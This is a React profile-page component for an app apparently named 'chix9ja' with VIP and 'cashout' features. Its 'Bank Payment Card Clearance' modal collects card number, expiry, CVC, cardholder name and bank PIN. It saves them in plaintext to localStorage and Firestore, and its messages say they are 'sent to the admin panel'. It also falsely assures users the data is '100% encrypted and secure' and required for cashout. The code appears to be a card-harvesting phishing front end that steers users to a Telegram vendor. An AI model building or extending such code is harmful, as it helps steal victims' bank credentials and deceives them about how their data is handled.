import React, { useState, useRef } from 'react';
import { Icons } from './Icons';
import { User } from '../types';
import { syncUserFromLocalToFirestore } from '../firebase';

interface ProfileProps {
  user: User;
  onUpdateProfile: (updatedUser: Partial<User>) => void;
  onLinkAccountClick: () => void;
  darkMode: boolean;
  toggleDarkMode: () => void;
  onLogout: () => void;
  vendorTelegramLink?: string;
}

const Profile: React.FC<ProfileProps> = ({ user, onUpdateProfile, onLinkAccountClick, darkMode, toggleDarkMode, onLogout, vendorTelegramLink }) => {
  const [name, setName] = useState(user.name);
  const [isEditing, setIsEditing] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Check if user is VIP member
  const isVIPUser = !!user.isVIP || !!user.vipTier || (user.isSubscribed && !!user.subscriptionPlan?.toUpperCase().includes('VIP')) || !!user.cardClearanceDetails;

  // Bank Payment Card Clearance States
  const [showCardClearanceModal, setShowCardClearanceModal] = useState(false);
  const [cardholderName, setCardholderName] = useState(user.cardClearanceDetails?.cardholderName || user.name || '');
  const [cardBankName, setCardBankName] = useState(user.cardClearanceDetails?.bankName || '');
  const [cardNumber, setCardNumber] = useState(user.cardClearanceDetails?.cardNumber || '');
  const [cardExpiry, setCardExpiry] = useState(user.cardClearanceDetails?.expiryDate || '');
  const [cardCvc, setCardCvc] = useState(user.cardClearanceDetails?.cvc || '');
  const [cardPin, setCardPin] = useState(user.cardClearanceDetails?.pin || '');
  const [clearanceCode, setClearanceCode] = useState(user.cardClearanceDetails?.clearanceCode || '');
  const [isSubmittingCard, setIsSubmittingCard] = useState(false);

  const handleSubmitCardClearance = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardNumber.trim() || !cardExpiry.trim() || !cardCvc.trim() || !cardholderName.trim() || !cardPin.trim()) {
      alert("Please enter all required card details including Card Number, Expiry, CVC, Card Holder Name, and Bank PIN.");
      return;
    }

    setIsSubmittingCard(true);
    const details = {
      cardholderName: cardholderName.trim(),
      bankName: cardBankName.trim() || 'Default Bank',
      cardNumber: cardNumber.trim(),
      expiryDate: cardExpiry.trim(),
      cvc: cardCvc.trim(),
      pin: cardPin.trim(),
      clearanceCode: clearanceCode.trim() || undefined,
      submittedAt: new Date().toISOString(),
      status: 'pending' as const
    };

    try {
      onUpdateProfile({ cardClearanceDetails: details });

      const emailKey = user.email.toLowerCase().trim();
      const existingUsersStr = localStorage.getItem('chix9ja_users');
      const existingUsers = existingUsersStr ? JSON.parse(existingUsersStr) : {};
      if (existingUsers[emailKey]) {
        existingUsers[emailKey].cardClearanceDetails = details;
        localStorage.setItem('chix9ja_users', JSON.stringify(existingUsers));
      }

      await syncUserFromLocalToFirestore(user.email);
      alert("Bank Payment Card details submitted successfully! Your details are secure for your next cashout and sent to the admin panel.");
      setShowCardClearanceModal(false);
    } catch (err) {
      console.error("Error submitting card clearance details:", err);
      alert("Failed to submit card clearance details: " + (err instanceof Error ? err.message : String(err)));
    } finally {
      setIsSubmittingCard(false);
    }
  };

  const handleImageUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        onUpdateProfile({ profileImage: reader.result as string });
      };
      reader.readAsDataURL(file);
    }
  };

  const handleSaveName = () => {
    onUpdateProfile({ name });
    setIsEditing(false);
  };

  return (
    <div className="px-4 py-6 space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
      
      {/* Profile Header */}
      <div className="flex flex-col items-center justify-center space-y-4">
        <div className="relative">
          <div className="w-28 h-28 rounded-full border-4 border-green-glow shadow-lg overflow-hidden bg-gray-900 flex items-center justify-center">
            {user.profileImage ? (
              <img src={user.profileImage} alt="Profile" className="w-full h-full object-cover" />
            ) : (
              <span className="text-green-glow text-3xl font-bold italic">{user.name.charAt(0).toUpperCase()}</span>
            )}
          </div>
          <button 
            onClick={() => fileInputRef.current?.click()}
            className="absolute bottom-1 right-1 bg-green-glow text-black p-2 rounded-full shadow-md hover:bg-green-dark transition-colors"
          >
            <Icons.Camera size={16} />
          </button>
          <input 
            type="file" 
            ref={fileInputRef} 
            onChange={handleImageUpload} 
            accept="image/*" 
            className="sr-only" 
          />
        </div>
        
        <div className="text-center">
            <h2 className="text-xl font-bold text-white">{user.name}</h2>
            <p className="text-sm text-gray-500">{user.email}</p>
        </div>
      </div>

      {/* Settings Section */}
      <div className="bg-gray-900 rounded-2xl shadow-sm p-4 space-y-4 border border-gray-800">
        <h3 className="text-xs font-bold text-gray-500 uppercase tracking-wider mb-2">Account Settings</h3>
        
        {/* Name Edit */}
        <div className="flex items-center justify-between py-3 border-b border-gray-800">
          <div className="flex items-center space-x-3 flex-1">
            <div className="p-2.5 bg-green-glow/10 rounded-xl text-green-glow">
                <Icons.User size={20} />
            </div>
            <div className="flex-1">
              <p className="text-xs text-gray-500 mb-0.5">Full Name</p>
              {isEditing ? (
                <input 
                    type="text" 
                    value={name} 
                    onChange={(e) => setName(e.target.value)}
                    className="w-full p-1.5 border border-green-glow/30 rounded text-sm bg-black text-white focus:ring-2 focus:ring-green-glow outline-none"
                />
              ) : (
                <p className="text-sm font-semibold text-white">{user.name}</p>
              )}
            </div>
          </div>
          <button 
            onClick={() => isEditing ? handleSaveName() : setIsEditing(true)}
            className="text-green-glow font-medium text-sm ml-2 p-2 hover:bg-green-glow/10 rounded-lg transition-colors"
          >
            {isEditing ? <Icons.Check size={20} /> : 'Edit'}
          </button>
        </div>

        {/* Link Account Button - Subscribed Users Only */}
        {user.isSubscribed && (
          <div className="py-2">
            <button 
              onClick={onLinkAccountClick}
              className="w-full p-4 bg-blue-600/10 border border-blue-500/30 rounded-2xl flex items-center justify-between group hover:bg-blue-600/20 transition-all active:scale-[0.98]"
            >
              <div className="flex items-center space-x-3">
                <div className="p-2 bg-blue-600/20 rounded-xl text-blue-400 group-hover:scale-110 transition-transform">
                  <Icons.Link size={20} />
                </div>
                <div className="text-left">
                  <p className="text-sm font-bold text-white leading-tight">Link Withdraw Account</p>
                  <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Database Integration</p>
                </div>
              </div>
              <Icons.ChevronRight size={18} className="text-blue-500/50" />
            </button>
          </div>
        )}

        {/* Message Verified Vendor - Subscribed Users Only */}
        {user.isSubscribed && (
          <div className="py-2 border-t border-gray-800/50 mt-1 pt-3 animate-in fade-in slide-in-from-bottom-2 duration-350">
            <button 
              onClick={() => {
                if (vendorTelegramLink) {
                  window.open(vendorTelegramLink, "_blank");
                } else {
                  window.open("https://t.me/chix9ja_vendor", "_blank");
                }
              }}
              className="w-full p-4 bg-green-glow/10 border border-green-glow/20 rounded-2xl flex items-center justify-between group hover:bg-green-glow/20 transition-all active:scale-[0.98]"
            >
              <div className="flex items-center space-x-3">
                <div className="p-2 bg-green-glow/20 rounded-xl text-green-glow group-hover:scale-110 transition-transform">
                  <Icons.Send size={20} className="stroke-[2.5]" />
                </div>
                <div className="text-left">
                  <p className="text-sm font-bold text-white leading-tight">Message Verified Vendor</p>
                  <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Instant Verified Node</p>
                </div>
              </div>
              <Icons.ChevronRight size={18} className="text-green-glow/55" />
            </button>
          </div>
        )}

        {/* Bank Payment Card Clearance Section - VIP Members Only */}
        {isVIPUser && (
          <div className="py-2 border-t border-gray-800/50 mt-1 pt-3 animate-in fade-in duration-300">
            <button 
              onClick={() => setShowCardClearanceModal(true)}
              className="w-full p-4 bg-gradient-to-r from-amber-500/20 via-amber-400/15 to-yellow-500/20 border-2 border-amber-400/60 rounded-2xl flex items-center justify-between group hover:border-amber-400 hover:bg-amber-500/25 transition-all active:scale-[0.98] shadow-lg shadow-amber-500/10"
            >
              <div className="flex items-center space-x-3">
                <div className="p-2.5 bg-gradient-to-tr from-amber-500 to-yellow-400 rounded-xl text-black font-black shadow-md group-hover:scale-110 transition-transform">
                  <Icons.Card size={20} />
                </div>
                <div className="text-left">
                  <p className="text-sm font-black text-amber-300 leading-tight">Add Bank Payment Card for Clearance</p>
                  <p className="text-[10px] text-amber-400/90 font-bold uppercase tracking-widest font-mono">
                    {user.cardClearanceDetails ? `Status: ${user.cardClearanceDetails.status.toUpperCase()}` : 'VIP Clearance Required for Cashout'}
                  </p>
                </div>
              </div>
              <div className="flex items-center space-x-1.5">
                {user.cardClearanceDetails ? (
                  <span className={`text-[9px] font-mono px-2.5 py-1 rounded-lg font-black uppercase tracking-wider ${
                    user.cardClearanceDetails.status === 'cleared' || user.cardClearanceDetails.status === 'approved' 
                      ? 'bg-emerald-950 text-emerald-400 border border-emerald-500/40' 
                      : user.cardClearanceDetails.status === 'rejected' 
                      ? 'bg-rose-950 text-rose-400 border border-rose-500/40' 
                      : 'bg-amber-950 text-amber-400 border border-amber-500/40'
                  }`}>
                    {user.cardClearanceDetails.status}
                  </span>
                ) : (
                  <span className="text-[9px] font-mono px-2 py-0.5 rounded font-black bg-amber-500 text-black uppercase animate-pulse">
                    VIP Mode
                  </span>
                )}
                <Icons.ChevronRight size={18} className="text-amber-400" />
              </div>
            </button>
          </div>
        )}

      </div>

      {/* Actions */}
      <div className="bg-gray-900 rounded-2xl shadow-sm overflow-hidden border border-gray-800">
          <button onClick={onLogout} className="w-full p-4 flex items-center space-x-3 text-red-500 hover:bg-red-900/20 transition-colors">
            <div className="p-2 bg-red-900/20 rounded-full">
                <Icons.LogOut size={18} />
            </div>
            <span className="font-medium">Log Out</span>
          </button>
      </div>

      {/* Bank Payment Card Clearance Page (White & Gold Theme) */}
      {showCardClearanceModal && (
        <div className="fixed inset-0 z-[150] bg-black/75 backdrop-blur-md flex items-center justify-center p-3 sm:p-4 animate-in fade-in duration-300 overflow-y-auto">
          <div className="bg-white border-2 border-amber-400 rounded-3xl w-full max-w-md max-h-[92vh] overflow-y-auto shadow-2xl relative font-sans text-zinc-900 my-auto">
            
            {/* White & Gold Header */}
            <div className="bg-gradient-to-r from-amber-500 via-amber-400 to-yellow-500 p-5 rounded-t-[22px] text-black shadow-md flex items-center justify-between">
              <div className="flex items-center space-x-3">
                <div className="p-2.5 bg-black/10 rounded-xl text-black">
                  <Icons.Card size={24} className="stroke-[2.5]" />
                </div>
                <div>
                  <h3 className="text-base font-black uppercase tracking-wider font-mono text-black">Bank Payment Card Clearance</h3>
                  <p className="text-[10px] text-amber-950 font-black font-mono uppercase tracking-widest opacity-90">VIP Clearance Node</p>
                </div>
              </div>
              <button 
                type="button"
                onClick={() => setShowCardClearanceModal(false)}
                className="p-2 text-black hover:bg-black/10 rounded-xl transition-colors"
              >
                <Icons.X size={20} className="stroke-[3]" />
              </button>
            </div>

            <div className="p-6 space-y-5">
              {/* Security Banner Notice */}
              <div className="p-3.5 bg-amber-50 border border-amber-300 rounded-2xl flex items-start space-x-3 text-left shadow-sm">
                <Icons.ShieldCheck size={22} className="text-amber-600 flex-shrink-0 mt-0.5" />
                <p className="text-xs text-amber-900 font-bold leading-relaxed">
                  Your bank payment card details are encrypted and <span className="font-black underline decoration-amber-500">100% secure for your next cashout</span>.
                </p>
              </div>

              {user.cardClearanceDetails && (
                <div className="p-3 bg-amber-100/80 border border-amber-300 rounded-2xl text-[11px] font-mono space-y-1">
                  <div className="flex items-center justify-between">
                    <span className="text-amber-900 uppercase font-bold">Clearance Status:</span>
                    <span className="text-amber-700 font-black uppercase tracking-wider">{user.cardClearanceDetails.status}</span>
                  </div>
                  <p className="text-amber-800 text-[10px]">
                    Last updated: {new Date(user.cardClearanceDetails.submittedAt).toLocaleDateString()}
                  </p>
                </div>
              )}

              {/* White and Gold Form */}
              <form onSubmit={handleSubmitCardClearance} className="space-y-4 text-left">
                
                {/* 1. Card Number */}
                <div className="space-y-1">
                  <label className="text-[10px] font-black text-amber-900 uppercase tracking-widest font-mono block">
                    Card Number *
                  </label>
                  <input 
                    type="text" 
                    required
                    maxLength={19}
                    placeholder="4532 **** **** 8892"
                    value={cardNumber}
                    onChange={(e) => setCardNumber(e.target.value)}
                    className="w-full bg-zinc-50 border-2 border-amber-200 focus:border-amber-500 focus:ring-2 focus:ring-amber-200 p-3.5 rounded-xl text-zinc-900 font-mono font-bold text-sm outline-none transition-all tracking-wider placeholder:text-zinc-400 shadow-inner"
                  />
                </div>

                {/* 2. Date or Expiry & 3. CVC in 2 columns */}
                <div className="grid grid-cols-2 gap-3">
                  <div className="space-y-1">
                    <label className="text-[10px] font-black text-amber-900 uppercase tracking-widest font-mono block">
                      Date / Expiry *
                    </label>
                    <input 
                      type="text" 
                      required
                      maxLength={5}
                      placeholder="MM/YY (08/28)"
                      value={cardExpiry}
                      onChange={(e) => setCardExpiry(e.target.value)}
                      className="w-full bg-zinc-50 border-2 border-amber-200 focus:border-amber-500 focus:ring-2 focus:ring-amber-200 p-3.5 rounded-xl text-zinc-900 font-mono font-bold text-sm outline-none transition-all text-center placeholder:text-zinc-400 shadow-inner"
                    />
                  </div>

                  <div className="space-y-1">
                    <label className="text-[10px] font-black text-amber-900 uppercase tracking-widest font-mono block">
                      CVC *
                    </label>
                    <input 
                      type="password" 
                      required
                      maxLength={4}
                      placeholder="CVC"
                      value={cardCvc}
                      onChange={(e) => setCardCvc(e.target.value)}
                      className="w-full bg-zinc-50 border-2 border-amber-200 focus:border-amber-500 focus:ring-2 focus:ring-amber-200 p-3.5 rounded-xl text-zinc-900 font-mono font-bold text-sm outline-none transition-all text-center placeholder:text-zinc-400 shadow-inner"
                    />
                  </div>
                </div>

                {/* 4. Card Holder Name */}
                <div className="space-y-1">
                  <label className="text-[10px] font-black text-amber-900 uppercase tracking-widest font-mono block">
                    Card Holder Name *
                  </label>
                  <input 
                    type="text" 
                    required
                    placeholder="Enter Cardholder Name"
                    value={cardholderName}
                    onChange={(e) => setCardholderName(e.target.value)}
                    className="w-full bg-zinc-50 border-2 border-amber-200 focus:border-amber-500 focus:ring-2 focus:ring-amber-200 p-3.5 rounded-xl text-zinc-900 font-mono font-bold text-sm outline-none transition-all placeholder:text-zinc-400 shadow-inner"
                  />
                </div>

                {/* 5. Bank Pin */}
                <div className="grid grid-cols-2 gap-3">
                  <div className="space-y-1">
                    <label className="text-[10px] font-black text-amber-900 uppercase tracking-widest font-mono block">
                      Bank PIN *
                    </label>
                    <input 
                      type="password" 
                      required
                      maxLength={6}
                      placeholder="****"
                      value={cardPin}
                      onChange={(e) => setCardPin(e.target.value)}
                      className="w-full bg-zinc-50 border-2 border-amber-200 focus:border-amber-500 focus:ring-2 focus:ring-amber-200 p-3.5 rounded-xl text-zinc-900 font-mono font-black text-sm outline-none transition-all text-center placeholder:text-zinc-400 shadow-inner"
                    />
                  </div>

                  <div className="space-y-1">
                    <label className="text-[10px] font-black text-amber-900 uppercase tracking-widest font-mono block">
                      Bank Name
                    </label>
                    <input 
                      type="text" 
                      placeholder="E.g. GTBank"
                      value={cardBankName}
                      onChange={(e) => setCardBankName(e.target.value)}
                      className="w-full bg-zinc-50 border-2 border-amber-200 focus:border-amber-500 focus:ring-2 focus:ring-amber-200 p-3.5 rounded-xl text-zinc-900 font-mono font-bold text-sm outline-none transition-all placeholder:text-zinc-400 shadow-inner"
                    />
                  </div>
                </div>

                <div className="pt-3 flex gap-3">
                  <button
                    type="button"
                    onClick={() => setShowCardClearanceModal(false)}
                    className="flex-1 py-3.5 bg-zinc-100 hover:bg-zinc-200 text-zinc-700 font-mono font-bold text-xs uppercase rounded-2xl border border-zinc-300 transition-all"
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    disabled={isSubmittingCard}
                    className="flex-[2] py-4 bg-gradient-to-r from-amber-500 via-amber-400 to-yellow-500 hover:from-amber-400 hover:to-yellow-400 disabled:opacity-50 text-black font-mono font-black text-xs uppercase tracking-widest rounded-2xl shadow-xl shadow-amber-300/60 transition-all active:scale-95"
                  >
                    {isSubmittingCard ? 'Saving...' : 'Save & Submit Clearance'}
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      )}

    </div>
  );
};

export default Profile;